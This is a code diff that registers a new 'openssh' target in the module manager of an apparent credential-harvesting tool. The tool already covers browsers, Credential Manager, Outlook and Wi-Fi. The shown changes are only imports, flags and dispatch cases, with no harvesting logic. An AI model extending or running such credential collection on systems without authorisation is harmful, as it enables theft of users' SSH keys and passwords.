@@ -2,6 +2,7 @@ import sys
 
 from modules.chromium.chromium import Chromium
 from modules.firefox.mozilla import Mozilla
+from modules.openssh.openssh import Openssh
 
 if sys.platform.startswith('win32'):
 	import libs.windows.winstructure as win
@@ -78,6 +79,7 @@ class ModuleManager:
 			'firefox': [],
 			'internet explorer': False,
 			'credman': False,
+			'openssh': False,
 			'outlook': False,
 			'wifi': False
 		}
@@ -99,6 +101,8 @@ class ModuleManager:
 			self.targets.get('firefox').extend([module for module in firefox_browsers])
 			self.targets.get('chromium').extend([module for module in chromium_browsers])
 
+			self.targets['openssh'] = True
+
 			if sys.platform.startswith('win32'):
 				self.targets['internet explorer'] = True
 
@@ -112,6 +116,10 @@ class ModuleManager:
 				self.targets['wifi'] = True
 
 		else:
+
+			if 'openssh' in modules:
+				self.targets['openssh'] = True
+
 			if 'internet explorer' in modules and sys.platform.startswith('win32'):
 				self.targets['internet explorer'] = True
 
@@ -134,6 +142,7 @@ class ModuleManager:
 			'firefox': [],
 			'internet explorer': False,
 			'credman': False,
+			'openssh': False,
 			'outlook': False,
 			'wifi': False
 		}
@@ -157,6 +166,8 @@ class ModuleManager:
 							drivers.extend([IE()])
 					case 'credman':
 						drivers.extend([Credman()])
+					case 'openssh':
+						drivers.extend([Openssh()])
 					case 'outlook':
 						drivers.extend([Outlook()])
 					case 'wifi':
